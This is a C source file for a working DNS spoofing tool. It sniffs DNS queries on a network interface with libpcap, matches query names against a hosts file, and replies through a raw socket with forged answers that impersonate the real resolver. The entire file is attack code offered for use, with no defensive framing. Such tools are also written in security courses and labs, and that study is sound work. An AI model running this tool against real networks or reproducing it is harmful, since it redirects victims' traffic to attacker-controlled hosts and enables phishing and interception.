#include <stdio.h>
#include <unistd.h>
#include <stdbool.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <assert.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <net/ethernet.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>

#include <pcap.h>
#include <netdb.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <string.h>
#include <ctype.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <resolv.h>

#include "struct.h"

#define IP_SIZE 16
#define REQUEST_SIZE 100
#define PCAP_INTERFACENAME_SIZE 16
#define FILTER_SIZE 200
#define PKT_SIZE 8192

void send_response(char* ip, u_int16_t port, char* packet, int packlen) {
  struct sockaddr_in to_addr;
  int bytes_sent;
  int one = 1;
  const int *val = &one;

  to_addr.sin_family = AF_INET;
  to_addr.sin_port = htons(port);
  to_addr.sin_addr.s_addr = inet_addr(ip);

  int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
  if (sock < 0) {
    printf("Socket error");
    return;
  }

  if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
    printf("setsockopt error");
    return;
  }

  bytes_sent = sendto(sock, packet, packlen, 0, (struct sockaddr *)&to_addr, sizeof(to_addr));
  if (bytes_sent < 0)
    printf("Error sending data");
}

unsigned short checksum(unsigned short *buf, int nwords) {
  unsigned long sum;
  for (sum = 0; nwords > 0; nwords--)
    sum += *buf++;
  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  return ~sum;
}

void get_data(char* data, unsigned int payload_size, char* src_ip, char* dst_ip, u_int16_t port) {
  struct ip *iph = (struct ip *) data;
  struct udphdr *udph = (struct udphdr *) (data + sizeof (struct ip));

  iph->ip_hl = 5;
  iph->ip_v = 4;
  iph->ip_tos = 0;
  iph->ip_len = sizeof(struct ip) + sizeof(struct udphdr) + payload_size; 
  iph->ip_id = 0;
  iph->ip_off = 0;
  iph->ip_ttl = 255;
  iph->ip_p = 17;
  iph->ip_sum = 0;
  iph->ip_src.s_addr = inet_addr (dst_ip);
  iph->ip_dst.s_addr = inet_addr(src_ip);

  udph->source = htons(53);
  udph->dest = htons(port);
  udph->len = htons(sizeof(struct udphdr) + payload_size);
  udph->check = 0;

  iph->ip_sum = checksum((unsigned short *) data, iph->ip_len >> 1);
}

unsigned int get_ans(char *ip, struct dns_header *dns_hdr, char* answer, char* request) {
  unsigned int size = 0; /* answer size */
  struct dns_query *dns_q;
  unsigned char ans[4];

  sscanf(ip, "%d.%d.%d.%d", (int *)&ans[0], (int *)&ans[1], (int *)&ans[2], (int *)&ans[3]);
  dns_q = (struct dns_query*)(((char*) dns_hdr) + sizeof(struct dns_header));
 
  memcpy(&answer[0], dns_hdr->id, 2);
  memcpy(&answer[2], "\x81\x80", 2);
  memcpy(&answer[4], "\x00\x01", 2);
  memcpy(&answer[6], "\x00\x01", 2);
  memcpy(&answer[8], "\x00\x00", 2);
  memcpy(&answer[10], "\x00\x00", 2);
 
  size = strlen(request) + 2;
  memcpy(&answer[12], dns_q, size);
  size += 12;
  memcpy(&answer[size], "\x00\x01", 2);
  size += 2;
  memcpy(&answer[size], "\x00\x01", 2);
  size += 2;
  memcpy(&answer[size], "\xc0\x0c", 2);
  size += 2;
  memcpy(&answer[size], "\x00\x01", 2);
  size += 2;
  memcpy(&answer[size], "\x00\x01", 2);
  size += 2;
  memcpy(&answer[size], "\x00\x00\x00\x22", 4);
  size += 4;
  memcpy(&answer[size], "\x00\x04", 2);
  size += 2;
  memcpy(&answer[size], ans, 4);
  size += 4;

  return size;
}

void get_dns_req(struct dns_query *dns_q, char *request) {
  unsigned int i, j, k;
  char *curr = dns_q->qname;
  unsigned int size;

  size = curr[0];

  j = 0;
  i = 1;
  while (size > 0) {
    for (k = 0; k < size; k++) {
      request[j++] = curr[i + k];
    }
    request[j++] = '.';
    i += size;
    size = curr[i++];
  }
  request[--j] = '\0';
}

void get_ip(u_int32_t raw_ip, char* ip) {
  int i;
  int aux[4];

  for (i = 0; i < 4; i++) {
    aux[i] = (raw_ip >> (i * 8)) & 0xff;
  }

  sprintf(ip, "%d.%d.%d.%d", aux[0], aux[1], aux[2], aux[3]);
}

void get_dns(const u_char *packet, struct dns_header **dns_hdr, struct dns_query *dns_q, char* src_ip, char* dst_ip, u_int16_t *port) {
  struct ethernet_header *ether;
  struct iphdr *ip;
  struct udphdr *udp;
  unsigned int iphdr_size;

  /* ethernet header */
  ether = (struct ethernet_header*)(packet);

  /* ip header */
  ip = (struct iphdr*)(((char*) ether) + sizeof(struct ethernet_header));
  get_ip(ip->saddr, src_ip);
  get_ip(ip->daddr, dst_ip);

  /* udp header */
  iphdr_size = ip->ihl * 4;
  udp = (struct udphdr *)(((char*) ip) + iphdr_size);
  (*port) = ntohs((*(u_int16_t*)udp));

  /* dns header */
  *dns_hdr = (struct dns_header*)(((char*) udp) + sizeof(struct udphdr));

  dns_q->qname = ((char*) *dns_hdr) + sizeof(struct dns_header);

}

/**
 * Callback function to handle packets
 */
void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {
  struct dns_query dns_q;
  struct dns_header *dns_hdr;
  struct list *head, *curr;

  char data[PKT_SIZE];
  char* answer;
  unsigned int size;
  char req[REQUEST_SIZE];
  char src_ip[IP_SIZE], dst_ip[IP_SIZE];
  u_int16_t port;

  memset(data, 0, PKT_SIZE);
  head = (struct list *) args;
  get_dns(packet, &dns_hdr, &dns_q, src_ip, dst_ip, &port);
  get_dns_req(&dns_q, req);

  curr = head;
  while(curr != NULL) {
    if (!strcmp(req, curr->host)) {
      answer = data + sizeof(struct ip) + sizeof(struct udphdr);
      size = get_ans(curr->ip, dns_hdr, answer, req);
      get_data(data, size, src_ip, dst_ip, port);
      size += (sizeof(struct ip) + sizeof(struct udphdr));
      send_response(src_ip, port, data, size);
      break;
    }
    curr = curr->next;
  }
}

struct list* init_hosts(char *filename) {
  FILE* file = fopen(filename, "r");
  if (file == NULL)
    return NULL;

  char line[256];
  struct list *curr, *head = NULL;

  while (fgets(line, sizeof(line), file)) {
    curr = (struct list *) malloc (sizeof(struct list));
    sscanf(line, "%s\t%s", curr->ip, curr->host);
    curr->next = head;
    head = curr;
  }

  fclose(file);
  return head;
}

int main(int argc, char **argv) {
  int opt = 0;
  char *interface = NULL;
  char *file = NULL;
  char *str = NULL;
  char expr[100];

  char err[PCAP_ERRBUF_SIZE];
  struct bpf_program filter;
  pcap_t *handle;
  bpf_u_int32 mask;
  bpf_u_int32 net;
  struct list *head = NULL, *curr;

  while ((opt = getopt(argc, argv, "i:f:")) != -1) {
    switch (opt) {
    case 'i':
      interface = optarg;
     
      break;
    case 'f':
      file = optarg;
     
      break;
    default:
      printf("Specify proper options\nUse mydump -h for Help\n");
      return 0;
    }
  }

  if (optind < argc - 1) {
    printf("Specify proper options\nUse mydump -h for Help\n");
    return 0;
  } else if (optind == argc - 1)
    str = argv[argc - 1];

  if (interface == NULL) {
    interface = pcap_lookupdev(err);
    if (interface == NULL) {
      printf("pcap_lookupdev error : %s\n", err);
      return 0;
    }
  }

  if ((head = init_hosts(file)) == NULL) {
    printf("Error opening file\n");
    return 0;
  }

  if (interface != NULL) {
    if (pcap_lookupnet(interface, &net, &mask, err) == -1) {
      printf("pcap_lookupnet error : %s\n", err);
      net = 0;
      mask = 0;
    }
    handle = pcap_open_live(interface, BUFSIZ, 1, 1, err);
    if (handle == NULL) {
      printf("pcap_open_live error : %s\n", err);
      return 0;
    }
  }

  sprintf(expr, "udp and dst port domain");
  if (str != NULL) {
    strcat(expr, " and ");
    strcat(expr, str);
  }

 
  if (pcap_compile(handle, &filter, expr, 0, net) == -1) {
    printf("pcap_compile error : %s\n", pcap_geterr(handle));
    return 0;
  }
 
  if (pcap_setfilter(handle, &filter) == -1) {
    printf("pcap_setfilter error : %s\n", pcap_geterr(handle));
    return 0;
  }

  pcap_loop(handle, -1, got_packet, (u_char *)head);
  pcap_close(handle);

  return 0;
}